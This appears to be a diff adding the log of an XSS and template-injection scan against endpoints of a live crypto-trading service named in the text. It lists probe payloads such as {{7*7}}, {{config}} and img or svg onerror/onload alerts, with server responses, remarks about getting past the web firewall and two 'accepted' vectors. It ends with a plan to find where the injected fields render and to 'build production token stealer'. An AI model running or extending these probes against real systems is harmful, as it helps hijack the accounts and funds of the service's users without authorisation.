@@ -1,0 +1,71 @@
+================================================================================
+🦊 FINAL XSS HUNT - REAL ENDPOINTS FROM STR8GOLD
+================================================================================
+
+[1] Testing IDOR endpoints for XSS injection
+------------------------------------------------------------
+
+   [F1] bind_invite - invite_code
+      Template: {{7*7}}
+      Status: 500 | ⚠️ Server error (bypassed WAF!)
+      Template2: {{config}}
+      Status: 500 | ⚠️ Server error (bypassed WAF!)
+      IMG: <img src=x onerror=alert(1)>
+      Status: 403 | ❌ WAF
+      SVG: <svg onload=alert(1)>
+      Status: 403 | ❌ WAF
+
+   [F2] dividend_info - from_address
+      Template: {{7*7}}
+      Status: 200 | Code: 0 | ✅ ACCEPTED!
+      Template2: {{config}}
+      Status: 200 | Code: 0 | ✅ ACCEPTED!
+      IMG: <img src=x onerror=alert(1)>
+      Status: 403 | ❌ WAF
+      SVG: <svg onload=alert(1)>
+      Status: 403 | ❌ WAF
+
+   [referral_info] - from_address
+      Template: {{7*7}}
+      Template2: {{config}}
+
+   [cashback_info] - from_address
+      Template: {{7*7}}
+      Template2: {{config}}
+
+   [invite_info] - from_address
+      Template: {{7*7}}
+      Template2: {{config}}
+
+[2] Testing GET endpoints for Reflected XSS
+------------------------------------------------------------
+
+   [get_tg_invitation_code] - No params (can't inject)
+
+   [rank endpoints] - orderby/direction params
+      Template: {{7*7}}
+      Template2: {{config}}
+
+================================================================================
+🎯 XSS HUNT RESULTS
+================================================================================
+
+✅ Found 2 potential XSS vectors!
+
+• dividend_info - from_address
+  Payload: {{7*7}}
+
+• dividend_info - from_address
+  Payload: {{config}}
+
+💾 Saved to: xss_final_results.json
+
+🚀 NEXT STEPS:
+1. Check where gmgn.ai DISPLAYS these fields:
+   - Wallet lists (if from_address accepted)
+   - Referral dashboard (if invite_code accepted)
+   - Rankings page (if reflected)
+2. Visit that page → XSS should fire!
+3. Build production token stealer with working vector
+
+================================================================================
